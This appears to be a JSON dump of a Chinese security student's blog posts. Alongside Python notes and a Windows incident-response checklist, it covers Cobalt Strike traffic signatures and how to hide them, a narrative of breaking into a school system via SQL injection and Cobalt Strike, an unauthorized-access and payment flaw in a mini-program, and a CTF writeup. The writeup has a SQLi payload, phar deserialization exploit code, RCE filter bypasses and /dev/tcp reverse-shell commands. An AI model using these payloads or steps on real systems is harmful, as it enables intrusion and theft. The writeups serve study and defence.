Student(Person):    passp = Person(&#x27;snail&#x27;,21,&#x27;贵州&#x27;)teacher = Teacher(&#x27;tom&#x27;,10,&#x27;贵州&#x27;)s1 = Student(&#x27;xiaowu&#x27;,87,&#x27;四川&#x27;)s1.eat()s1.speak()# 继承可以继承父类中的所有非私有方法， 也就是这里的`__write`方法将不会被继承 `__` 是python中私有方法的语法定义 \n那么执行后你会发现即使Student类中并没有定义eat()方法和speak()方法 但是也同样能够输出 这就是继承继承的语很简单 直接在类后面的括号里面跟上需要继承的类即可。\n例如：\nclass B(object):    pass  # 这里自己写需要的方法class A(B):    passa = A()a.B中所有公共方法。\n那么我们想在父类继承来的方法里面执行子类的特有的代码怎么办,这里就引入了新的名词重写\n那么什么是重写呢？\n\n我的理解是，从父类继承过来，只有父类的方法和属性，那么我自己想要在父类的基础上面修改方法和属性该怎么办呢，那么重写就是用来解决这个问题的。  也就是继承后，可以进行修改继承来的方法，  如果有系统的属性和方法，进行重写， 也就是从父类继承来的方法会进行重新定义。例：\n\nclass Animals(object):    def eat(self):        print(&#x27;i can eat&#x27;)    def call(self):        print(&#x27;i can call phone &#x27;)class Dog(Animals):    def eat(self):        print(&#x27; i like eat gutouts&#x27;)class Cat(Animals):    def eat(self):        print(&#x27;i can 捉老鼠&#x27;)wangcai = Dog()wangcai.eat()wangcai.call()miao = Cat()miao.eat()miao.call()\n运行后便可以理解什么是重写了，也就是不同的类继承同一个父类后，进行方法的重写，之后执行的结果与父类和另外的子类的结果不同。那么问题又来啦，既然我们对父类的方法进行重写了，那如果我们还需要调用父类的方法，那该怎么办呢，对此，python引入了super()方法 \n\nsuper():调用父类的方法或属性,完整写法: super().属性 或者super.方法 就可以完成调用了\n\n调用例字:\nclass Car(object):    def __init__(self, brand, model, color):        self.brand = brand        self.model = model        self.color = color    def run(self):        print(&#x27;i can run&#x27;)class GasolineCar(Car):    def __init__(self, brand, model, color):        super().__init__(brand, model, color)    def run(self):        print(&#x27;i can run with gas&#x27;)class ElectricCar(Car):    def __init__(self, brand, model, color):        super().__init__(brand, model, color)        # 代表电池电量。        self.battery = 70    def run(self):        print(f&#x27;i can run whith electric,remind&#123;self.battery&#125;&#x27;)bmw = GasolineCar(&#x27;宝马&#x27;, &#x27;x5&#x27;, &#x27;白色&#x27;)bmw.run()tesla = ElectricCar(&#x27;特斯拉&#x27;, &#x27;model3&#x27;, &#x27;红色&#x27;)tesla.run()\n这里用车来做例子，我们发现我们这里都是用的父类的方法对车进行初始化的。也就是我们在子类中并没有重新写初始化的方法。而是调用父类中的。\n1.什么是多态多态指的是一类实物有多种形态，定义 多态是一种使用对象的方式，子类重写父类方法，调用不同子类对象的相同父类方法，可以产生不同的执行结果；\n\n多态依赖继承\n子类方法必须要重写父类方法。首先定义一个父类，其可能拥有多个子类对象，当我们调用一个公共方法时，传递的对象不同，则返回的结果不同。好处，调用灵活，有了多台，可以更容易编写出通用的代码，做出通用的编程，以适应需求的不断变化。、\n\n不同对象访问相同方法，返回不同结果  就是多态\n代码实现。多态可以基于继承，也可以不基于继承。\nclass Fruit(object):    def makejuice(self):        print(&#x27;i can make juice &#x27;)class Apple(Fruit):    def makejuice(self):        print(&#x27;i can make  apple juice &#x27;)class Banana(Fruit):    def makejuice(self):        print(&#x27;i can make Banana juice &#x27;)class Orange(Fruit):    def makejuice(self):        print(&#x27;i can make Orange juice &#x27;)# 利用多态。  定义一个service  公共方法接口def service(obj):    obj.makejuice()# apple = Apple()# apple.makejuice()  # 以往的方式，需要用一个调用一个# banana = Banana()# banana.makejuice()  # 橘子也是 一样# orange = Orange()# orange.makejuice()# 利用接口apple = Apple()banana = Banana()orange = Orange()for i in (apple,banana,orange):    service(i)\n这里的service就是多态的体现。\n","categories":["Python"],"tags":["Python","爬虫"]},{"title":"Windows的应急","url":"/2023/08/18/windows%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","content":"Windows的应急学习过程中看到师傅文章，所以顺便做了个思维导图 师傅太强了 原文链接已放文末。\n常见的应急响应事件分类。web入侵\n网页挂马\n\n主页篡改\n\nwebshell\n\n\n系统入侵\n病毒木马\n\n勒索病毒\n\n远控木马\n\n\n网络攻击\nddos\n\ndns劫持\n\narp欺骗\n\n\nwindows入侵排查1.1 检查账号安全性\n\n检查系统账号安全性。\n\n\n\n查看服务器是否存在可疑或者新增账号\n\n\n检查方法：\n\nWin+R打开运行窗口，输入lusrmgr.msc，查看是否有新增可疑的账号，如果有管理员群组里的新增账户，请立即禁用或者删掉\n\n\n管理员群组：\n\nAdministrators\n\n\n\n\n\n查看服务器是否存在隐藏账号，克隆账号等。\n\n\n检查方法：\n\n打开注册表：查看对应键值\n\n第一步：Win+R打开运行窗口，输入regedit打开注册表编辑器\n第二步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM，默认无法查看\n第三步：右击SAM，权限，选择当前用户(一般是Administrator),将权限勾选为完全控制，然后确定并且关闭注册表\n第四步：选择 HKEY_LOCAL_MACHINE&#x2F;SAM&#x2F;SAM&#x2F;Domains&#x2F;Account&#x2F;Users;\n第五步：在Names项下可以看到实例所有用户名\nTips:如果出现本地账户中没有的账户，即为隐藏账户，在确认为非系统用户的前提下，可删除此用户\n\n\n使用D盾_web查杀工具，集成了对克隆账号的检测功能\n\n\n\n\n\n结合日志，查看管理员登录时间、用户名是否存在异常。\n\n方法：\n\n\nWin+R打开运行窗口，输入eventvwr.msc，打开事件查看器。\n\n\n\n导出Windows日志–安全，利用Log Parser进行分析\n\n\n\n\n\n\n\n1.2 检查异常端口、进程\n\nnetstat -ano 查看目前的网络连接，定位可疑的ESTABLISHED状态\n\n\n\n根据netstat 确定PID，再通过tasklist | findstr “PID” 定位进程\n\n\n\nWin+R打开运行窗口，输入msinfo32，在【软件环境】-&gt; 【正在运行的任务】通过PID和进程名定位，就可以看到进程的详细信息，比如进程路径、进程ID、文件创建日期、启动时间等。\n\n\n\n在我们想要杀死进程的时候，可能因为进程绑定了系统服务，无法杀死，通过tasklist &#x2F;svc 查看进程对应的服务。Win+R打开运行窗口，输入serivces.msc，关闭对应服务，然后在杀死进程。\n\n\n\n查看Windows服务所对应的端口：\n\n\n%system%&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;services (一般%system%就是C:\\Windows)\n\n\nTips：当我们通过第3步确定落地文件之后，可以将可疑文件上传到威胁情报社区去做威胁情报检测。\n\n\n1.3 检查启动项、计划任务、服务\n1、检查服务器是否有异常的启动项\n\n\n登录服务器，单机【开始】-&gt; 【所有程序】-&gt;【启动】，默认情况下此目录是一个空目录，确认是否有非业务程序在该目录下\n\n\n\nWin+R打开运行窗口，输入msconfig，查看是否存在命名异常的启动项目，是则取消勾选该启动项，并到命令中显示的路径除文件\n\n\n\nWin+R打开运行窗口，输入regedit打开注册表，查看开机启动项是否正常，注册表项如下：\n\n\nHKEY_CURRENT_USER\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Micorsoft\\Windows\\CurrentVersion\\RunOnce检查右侧是否有启动异常的项目，有则删除，并建议安装杀毒软件进行病毒查杀，清除残留病毒或木马。\n\n\n\n利用安全软件查看启动项、开机时间管理等\n\n\n\nWin+R打开运行窗口，输入gpedit.msc打开本地组策略编辑器，单机【Windows】-&gt;【脚本(启动&#x2F;关机)】-&gt;【启动】&#x2F;【关机】查看是否有启动项\n\n\n\n\n2、检查计划任务\n\n3、服务自启动\n\n\n1.4 检查系统相关信息\n1、查看系统版本以及补丁信息\n\n检查方法：Win+R打开运行窗口，输入systeminfo，查看系统信息\n\n\n2、查找可疑目录及文件\n\n\n查看用户目录，新建账号会在这个目录生成一个用户目录\n\n\nWindows Server 2003 : C:\\Documents and Settings\nWindows Server 2008R2 : C:\\Users\\\n\n\n\nWin+R 打开运行窗口，输入%UserProfile%\\Recent，分析最近打开文件\n\n\n\n在服务器各个目录，可根据文件夹内文件列表时间进行排序，查找可疑文件\n\n\n\n回收站、浏览器下载目录、浏览器历史记录\n\n\n\n修改时间在创建时间之前的为可疑文件\n\n\n\n\n3、得到发现Webshell、远控木马的创建时间，找同一时间范围内创建的文件\n\n\n利用Registry Workshop 注册表编辑器的搜索功能，可以找到最后写入时间区间的文件\n\n\n\n利用计算机自带的文件搜索功能，指定修改时间进行搜索\n\n\n\n\n\n1.5 自动化查杀\n1、病毒查杀\n\n检查方法：下载安全软件，更新最新病毒库，进行全盘扫描\n\n\n2、webshell查杀\n\n检查方法：选择具体的站点路径进行webshell查杀，建议使用两款或者多款查杀工具同时查杀，可以相互补充规则库的不足\n\n\n\n1.6 日志分析\n1、系统日志\n\n\n前提：开启审核策略，若日后出现系统故障、安全事故则可以查看系统的日志文件，排除故障，追查入侵的信息等。\n\n\n\nWin+R打开运行窗口，输入eventvwr.msc，打开事件查看器\n\n\n\n导出应用程序日志、安全日志、系统日志，利用Log Parser进行分析\n\n\n\n\n2、web访问日志\n\n\n找到中间件的web日志，打包到本地方便进行分析\n\n\n\nWindows推荐使用EmEditor进行日志分析；Linux推荐使用shell命令组合查询分析\n\n\n\n\n常见日志存放路径\n\n1、apache服务器\n\nWindows : &lt;Apache安装目录&gt;\\logs\\access.log\nLinux :&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log\n若不存在，参考Apache配置文件httpd.conf中相关配置\n\n\n2、tomcat服务器\n\n日志文件通常位于Tomcat安装目录下的logs文件夹内，若不存在，则参考Tomcat配置文件Server.xml中的相关配置 ，如：\n\n\ndirectory&#x3D;”logs” prefix&#x3D;”localhost_access_log.”\nsuffix&#x3D;”.txt”\npattern&#x3D;”common” resolveHosts&#x3D;”false”&#x2F;&gt;\n\n\n\n\n3、IIS服务器\n\n默认位置：%systemroot%\\system32\\logfiles\\ 可自由设置\n默认日志命名方式：ex+年份的末两位数字+月份+日期+.log\n\n\n4、Nginx\n\n日志存储路径在Nginx配置文件中，其中：\nAccess_log变量规定了日志存放路径与名字，以及日志格式名称，默认值”access_log”\n\n\n5、Jboss\n\n默认不做访问日志记录\n修改${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;deploy&#x2F;jbossweb.sar&#x2F;server.xml（不同版本文件位置不一样）\n日志保存在${JBOSS_HOME}&#x2F;server&#x2F;default&#x2F;log&#x2F;下，前缀为：localhost_access_log\n\n\n\n\n\n关于配置文件\nTomcat: server.xml 会有服务器端口配置，日志配置等\nApache: httpd.conf是apache主要配置文件，包括端口，模块启用，日志配置等\nNginx: nginx.conf是主要配置文件，会有端口，重写，代理等配置，也会有日志配置等。\nIIS: web.config 是主要配置文件，通过IIS界面修改的配置会保存到web.config里，包括重写等操作，日志配置一般不变，通过界面就可查看\n\n参考链接： https://blog.csdn.net/weixin_44727454/article/details/125605281下面附上思维导图 \n我好菜  太废物了  淦\n\n","categories":["攻防演练","蓝队","应急响应"],"tags":["蓝队","应急"]},{"title":"内存马的一些粗浅的思维导图总结","url":"/2023/08/18/%E5%86%85%E5%AD%98%E9%A9%AC%E7%9A%84%E4%B8%80%E4%BA%9B%E7%B2%97%E6%B5%85%E7%9A%84%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE%E6%80%BB%E7%BB%93/","content":"感觉自己太废物了。麻了\n\n"},{"title":"Cobalt Strike 流量特征","url":"/2023/08/18/Cobalt%20Strick%20%E7%9A%84%E6%B5%81%E9%87%8F%E7%89%B9%E5%BE%81/","content":"Cobalt Strike 流量特征总结来源于网上资料， 有错的地方欢迎各位大佬指正。\n简介简介：Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， A-team详细介绍使用网址。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动特征默认端口 50050SSL 证书流量特征：\nkeystore type: jks\nAlias name: cobaltstrike\nOwn: CN&#x3D;Major Cobalt Strike\nIssuer: CN&#x3D;Major Cobalt Strike\n\n默认 C&#x2F;S 端通讯证书：字段和固定哈希值识别可以看到beacon的通信对比正常的http流量，CS的http通信流量具有以下几个特征：心跳包特征\na)\t间隔一定时间，均有通信，且流级上的上下行数据长度固定；\n\n域名&#x2F;IP特征\na)\t未走CDN、域前置的，域名及IP暴露\nb) 走CDN、域前置的，真实IP会被隐藏；\n\n指令特征\na)\t下发指令时，通过心跳包接收指令，这时，server端返回的包更长，甚至包含要加载的dll模块数据。\n\n\nb)\t指令执行完后，client端通过POST请求发送执行的结果数据，body部分通过加密和base64编码。\n\n\nc)\t不同指令，执行的时间间隔不一样，可以通过POST请求和GET请求的间隔进行判断。\n\n\n\n数据特征\na)\t在请求的返回包中，通信数据均隐藏在jqeury*.js中。\n\n去除特征的方法修改默认端口50050修改默认ssl证书\nkeytool -list -v -keystore cobaltstrike.store                                           \n参考链接：https://www.cnblogs.com/CoLo/p/14518441.html#0x00-%E5%85%B3%E9%97%AD%E5%90%8E%E5%8F%B0%E8%BF%90%E8%A1%8C%E7%9A%84cs\n\n修改profile\n","categories":["攻防演练","蓝队"],"tags":["流量分析"]},{"title":"文件包含&文件其他操作&RCE思维导图","url":"/2023/08/18/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&%E6%96%87%E4%BB%B6%E5%85%B6%E4%BB%96%E6%93%8D%E4%BD%9C&RCE%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/","content":"文件包含&amp;文件其他操作&amp;RCE思维导图\n\n\n"},{"title":"从sql注入到远程登录的简单利用","url":"/2023/06/01/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0%E8%BF%9C%E7%A8%8B%E7%99%BB%E5%BD%95%E7%9A%84%E7%AE%80%E5%8D%95%E5%88%A9%E7%94%A8/","content":"从sql注入到远程登录的简单利用很近没写文章了，来水水文章。请大家遵守网络安全法，切勿非法渗透。本文漏洞已报告给学校。\n最近收集了一些内网的资产，遇到一个有意思的系统，然后就随便搞了玩玩。比较简单，大佬勿喷。\n\n首先来一手弱口令，提示用户密码错误，哦豁，没戏了，弱口令进不去，直接放弃。开个玩笑，尝试一下闭合，发现报错，\n\n发现报错，\n\n接着我试了一下admin’– admin 万能密码，登录成功。\n\n成功进入系统那么可以肯定这里是有注入的，直接sqlmap一把梭哈，\n\n发现是sqlserver ，直接–os-shell\n\n然后web投递上线cs 上线提权 \n\n再利用插件获取明文密码 administrator  xxxxx\n然后登录 这里管理员改了一下登录的端口 \t27020 \n\n登录成功。但是想了想，没拿到密码，还想进一步，翻了下文件，看到备份文件\n\n看到有密码，但是连接错误\n\n改用windows身份验证，可以直接登录\n\n成功登录，然后选中刚刚的数据库，新建查询，\n\n密码md5加密过了，凭经验，可以知道，好几个密码是123456  \n\n选择登录  登录成功\n\n","categories":["渗透测试","漏洞挖掘"],"tags":["web渗透","SQL注入","后渗透"]},{"title":"某小程未授权+支付逻辑漏洞","url":"/2023/05/01/%E6%9F%90%E5%B0%8F%E7%A8%8B%E6%9C%AA%E6%8E%88%E6%9D%83+%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/","content":"某小程未授权+支付逻辑漏洞打开小程序主页 点击个人 抓包发现有id \n\n 点击余额 \n发现有id  发送repeater进行修改尝试\n\n自己余额id为0 修改其他id\n\n成功返回余额，直接拼接浏览器访问，发现也可以拿到数据 \n\n修改di为1 发现也存在，为了验证存在，直接爆破后四位，1111-9999 发现可以完全遍历 \n\n点击余额明细的时候，也可以抓包，可以看别人的\n\n\n经过测试，发现基本所有功能点都存在未授权 \n发现一个有意思的地方 他这连充值都是未授权的，也就是可以未授权用它一卡通余额里的钱给他充到小程序里面去，\n\n\n\n 历史订单处 &#x2F;order&#x2F;list?company_id&#x3D;15&amp;page&#x3D;1&amp;openid&#x3D;oH0xd49hFv19wWTowa7NWRWU4Sl0&amp;member_id&#x3D;227295&amp;charge_status&#x3D;complete\n其他的几处就不详细展示了\n\n","categories":["漏洞挖掘","渗透测试"],"tags":["web渗透"]},{"title":"Python中args kwargs参数的一些使用方法","url":"/2023/03/01/Python%E4%B8%ADargs%20kwargs%E5%8F%82%E6%95%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/","content":"Python中参数传递的一些理解。 大佬勿喷\n参数类型。形参和实参实参是实际参数，而形参是形式参数，例如 \ndef func(a,b,c): # 这里的a,b,c 就是形式参数，\tprint(a,b,c)func(12,3,45)     # 这里的12,3，45 就是实参，也就是实际参数\n\n参数的分类。位置参数def info(name,age,gender):    print(name,age,gender)info(&#x27;张三&#x27;, 23,&#x27;man&#x27;)\n\n运行结果：\n\n关键字参数 +默认值参数\n关键字参数：\n\ndef func(a,b,c):    print(a,b,c)func(a=2,c=1,b=3)\n\n结果：\n关键字传参可以不用管参数的位置，但是需要给参数一定的值。\n\n默认值传参。在现实生活中，我们需要录入很多重复的信息的时候，可以给定一个默认值，比如一个班级的学生，60个男生，5个女生的话，可以默认设置为男性。\n\ndef info2(name,age,gender=&#x27;woman&#x27;):    print(name,age,gender)info2(&#x27;刘亦菲&#x27;, 19)\n\n运行结果：\n参数对比结果对比：\ninfo函数中gender是没有给定默认值的，所以传参的时候需要给定值\n动态参数位置参数在运用过程中，我们可能需要传递的参数是不固定的，有时候参数多，有时候少，那么下面这个就可以解决这个问题。\n\n*args* args 表示可以接受所有传递进来的位置参数，同时也还可以接受列表和字典类型的传参。例：\n\n这里我们可以看到，我们传入进去的参数，都被以元组类型打印出来了，但是我们直接传参列表和字典，列表和字典都被当做一个参数传递，打印出来的是元组里面的列表和元组里面的字典，而如果我们传递*list和*dict的话 那么传递列表的值就是单独的，而且打印的时候是一个元组。而字典也会被单独传递键名。\n关键字参数\n**kwargs参数传递\n\n\n这里宇*不同的是，**kwargs的参数传递，只能关键字类型的和字典类型的传参，其他的会报错。\n**kwargs 只有在有关键字参数的时候，才会有字典的值\n混合参数的搭配使用通过上面的了解，我们有时候需要给定一些固定的位置参数，但是又需要传递未知长度的参数，甚至最后可能还需要给关键字参数，那么我们可以将所学的几种参数搭配使用。\n\n那么参数的使用顺序是位置参数&gt;*args&gt;关键字参数&gt;**kwargs这里解释以下为什么是这个顺序。这里的c 默认情况下是为你好的，但是我们打印的时候 c变为3了，我们想要的默认值就没法生效了，所以我们想要达到想要的结果，就只能修改传递位置参数的顺序，如图，如果上面第一个传参是*args参数的话，那么我们输入的前面10个参数，全部都会被它所接收，而**kwargs 只有在有关键字参数的时候，才会有字典的值 那么它为空，此时a和b两个参数，就已经没有参数了，这里显然是行不通的。但是打印的时候，关键字传参可以先打印。\n\n接受任意类型的参数。这个是一个比较特殊的\n\n如图所示，结果也进行了备注。\n","categories":["学习笔记","Python"],"tags":["笔记","python"]},{"title":"web安全学习相关文章(干货)","url":"/2022/12/01/web%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%9B%B8%E5%85%B3%E6%96%87%E7%AB%A0%20%EF%BC%88%E5%B9%B2%E8%B4%A7%EF%BC%81%EF%BC%89/","content":"web安全学习相关文章文章来源于群友分享。\n基础篇（已完结）：渗透测试之信息收集：https://blog.csdn.net/weixin_44268918/article/details/127903295?spm=1001.2014.3001.5502SQL注入基础原理与案例（详细总结）：https://blog.csdn.net/weixin_44268918/article/details/127421781?spm=1001.2014.3001.5502xss攻击详解：https://blog.csdn.net/weixin_44268918/article/details/127872483?spm=1001.2014.3001.5502文件上传漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128074253?spm=1001.2014.3001.5502CSRF及SSRF详解：https://blog.csdn.net/weixin_44268918/article/details/128091004?spm=1001.2014.3001.5502文件包含漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128133245?spm=1001.2014.3001.5502逻辑越权总结（超详细总结涉及各类越权）：https://blog.csdn.net/weixin_44268918/article/details/128347169?spm=1001.2014.3001.5502RCE代码及命令执行(详解)：https://blog.csdn.net/weixin_44268918/article/details/128386149?spm=1001.2014.3001.5502XXE&amp;XML漏洞详解：https://blog.csdn.net/weixin_44268918/article/details/128484412?spm=1001.2014.3001.5502工具篇（持续更新）：burpsuite安装与使用教程(含JDK配置环境)：https://blog.csdn.net/weixin_44268918/article/details/128207314?spm=1001.2014.3001.5502Godzilla(哥斯拉)安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128410989?spm=1001.2014.3001.5502Goby安装与使用：https://blog.csdn.net/weixin_44268918/article/details/128496096?spm=1001.2014.3001.5502AWVS安装与使用(最新版2022.12.27更新)：https://blog.csdn.net/weixin_44268918/article/details/128509290?spm=1001.2014.3001.5502Hydra(九头蛇)工具使用：https://blog.csdn.net/weixin_44268918/article/details/128531270?spm=1001.2014.3001.5502Nmap工具使用：https://blog.csdn.net/weixin_44268918/article/details/128546353?spm=1001.2014.3001.5502Metasploit工具使用(上)：https://blog.csdn.net/weixin_44268918/article/details/128775978?spm=1001.2014.3001.5502Metasploit工具使用(下)：https://blog.csdn.net/weixin_44268918/article/details/128801744?spm=1001.2014.3001.5502Cobalt Strike工具安装与基础使用：https://blog.csdn.net/weixin_44268918/article/details/128857998?spm=1001.2014.3001.5502Netcat安装与使用(nc)：https://blog.csdn.net/weixin_44268918/article/details/129179127?spm=1001.2014.3001.5502","categories":["学习笔记","渗透测试"],"tags":["推荐"]},{"title":"2022第五空间-web部分wp复盘总结","url":"/2022/10/01/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4-web%E9%83%A8%E5%88%86wp%E5%A4%8D%E7%9B%98%E6%80%BB%E7%BB%93/","content":"打了一天，麻了，大佬tql，这次get到了不少东西，一是一个不太常见的宽字节注入，我是真的没想到，而且后面也是看了wp理解了好一会才弄明白。\n0x01:题目是一个登录框，但是基本上是过滤掉了所有的常见注入的关键词。实在是没思路，后面看了大佬wp，才发现是宽字节注入，同时还要利用虚拟表，同时还有mysql的hex编码。payload：\n\nadmin%df%27%09ununionion%09selselectect%091,2,0x6531306164633339343962613539616262653536653035376632306638383365#&amp;password&#x3D;123456\n\n其中 0x6531306164633339343962613539616262653536653035376632306638383365 为 password&#x3D;123456d的hex(md5(password))  利用双写+宽字节构造payload。123456加密后的md5：e10adc3949ba59abbe56e057f20f883e因为宽字节的问题所以利用mysql 的hex编码一下：\n0x02:一个phar读取flag的操作，遇到这题的时候，phar差不多已经忘光了，首先扫目录得到www.zip 拿到源码进行简单的审计：开始以为是文件上传，后面一看发现是构造phar直接读。得到class.php \n&lt;?phpclass upload&#123;    public $filename;    public $ext;    public $size;    public $Valid_ext;    public function __construct()&#123;        $this-&gt;filename = $_FILES[&quot;file&quot;][&quot;name&quot;];        $this-&gt;ext = end(explode(&quot;.&quot;, $_FILES[&quot;file&quot;][&quot;name&quot;]));        $this-&gt;size = $_FILES[&quot;file&quot;][&quot;size&quot;] / 1024;        $this-&gt;Valid_ext = array(&quot;gif&quot;, &quot;jpeg&quot;, &quot;jpg&quot;, &quot;png&quot;);    &#125;    public function start()&#123;        return $this-&gt;check();    &#125;    private function check()&#123;        if(file_exists($this-&gt;filename))&#123;            return &quot;Image already exsists&quot;;        &#125;elseif(!in_array($this-&gt;ext, $this-&gt;Valid_ext))&#123;            return &quot;Only Image Can Be Uploaded&quot;;        &#125;else&#123;            return $this-&gt;move();        &#125;    &#125;    private function move()&#123;        move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;upload/&quot;.$this-&gt;filename);        return &quot;Upload succsess!&quot;;    &#125;    public function __wakeup()&#123;        echo file_get_contents($this-&gt;filename);    &#125;&#125;class check_img&#123;    public $img_name;    public function __construct()&#123;        $this-&gt;img_name = $_GET[&#x27;img_name&#x27;];    &#125;    public function img_check()&#123;        if(file_exists($this-&gt;img_name))&#123;            return &quot;Image exsists&quot;;        &#125;else&#123;            return &quot;Image not exsists&quot;;        &#125;    &#125;&#125;\n\n构造payload：\n&lt;?phpclass upload&#123;    public $filename = &quot;/flag&quot;;&#125;#new Phar()这里定义了生成的phar文件的名字(这里定义的时候后缀是一定要.phar)#实际上生成后后缀名也可以改(比如awsl.awsl也行),标志该文件是phar文件的是下面的__HALT那里$phar =new Phar(&quot;awsl.phar&quot;); $phar-&gt;startBuffering();#这里XXX的内容随便写,注意后面的XXX如果不用;来和__HALT分割记得留个空格隔开(个人觉得后面XXX还是写个PHP语句好,省点麻烦)#__HXXXX(注释里直接用全称会被识别)这一节在这个setStub这里必须保证这个为结尾而且不可省,标志这个为phar文件$phar-&gt;setStub(&quot;XXX&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;); #把要序列化的变量申明好(这里只知道能放序列化的一个变量,不知道怎么放多个(或许单个文件只能放一个序列化的变量))$a = new upload();#将目标变量存入(这里自动把它序列化了)$phar-&gt;setMetadata($a); #这里会按照文件名,文件内容的形式打包到phar文件中,当使用phar://awsl.phar://test.txt就会类似用include包含后面定义的代码(这里文件名不影响是否解析 $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);$phar-&gt;stopBuffering();?&gt;\n\nphar反序列化知识点可以看一下这篇文章：利用phar扩展PHP反序列化漏洞\n放到本地运行一下，这里记得需要在你PHP版本目录下的php.ini文件里面把phar.readonly = off 这一行的注释给去掉，并且改成off在本地运行php后，目录下会生成一个.phar的文件 因为phar是可以随便修改为jpg png gif的，所以这里直接随便改个后缀，然后上传 再读取的时候 get传参 phar://upload/文件名.jpg 即可得到flag\n0x03:一个有趣的RCE题打开发现有个ping 操作。 结合经验猜测是rce，爆破一下账号密码，得到账号：admin 密码：admin123登录后发现一样的，也是ban掉了很多关键词，利用字典fuzz 一波 这里给大家推荐一个字典：Web Pentesting Fuzz 字典,一个就够了。这里看到 %0a可以绕过。这里利用tac%09index.php 查看源码发现这里过滤了好多命令，看到可疑的目录kylin 但是他把kylin给ban了，构造通配符直接进行flag的读取。payload:\n\n?ip&#x3D;%0Acd%09ky?in%0aca\\t%09*成功得到flag：构造其他payload可以大家可以参考一下这篇：RCE漏洞之绕过\n\n总结：这次还是学到不少东西，最后成绩28，web队里师傅们ak了 但是最后那个sql注入我是现在还没看懂，所以就没总结了。收获蛮大的。扩展了不少的思路，get到了大佬平时的思路，rce的那题，读文件的时候，队里师傅写了个一句话木马上去，ban了那么多关键词，我是怎么也想不到怎么写上去的。按我平时的思路就是，利用常见的命令 例如echo命令写马，但ban掉了不少东西， 同时，/也被ban了，进目录是没法搞的。但是大佬的思路是啥，日志写马，日志写马倒也是想到过，可是我/给我ban掉了，当时就没想到怎么给进目录，那么自然也就没法写马了，完了请教大佬的时候，大佬给我的是这样的：思路是这样的，但是这个绕过属实是骚操作了。另外还get到一个思路，就是平常的rce 如果是没有过滤掉管道符这种，可以直接利用反弹shell，直接读flag具体操作这是linux的一些反弹shell的命令，windows的大家可以自行百度。常用的比如：\n\n&#x2F;bin&#x2F;bash -i &gt; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&lt;&amp; 2&gt;&amp;1\n\n\nbash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;127.0.0.1&#x2F;8080 0&gt;&amp;1等等，骚操作还有不少，还有一些空格的绕过之类的操作。可以百度一下，有不少文章可以借鉴参考。思路真的很重要，有时候你只能卡在一个地方走不了， 而大佬可以各种骚操作绕过等。\n\n","categories":["总结"],"tags":["CTF","wp","总结"]}]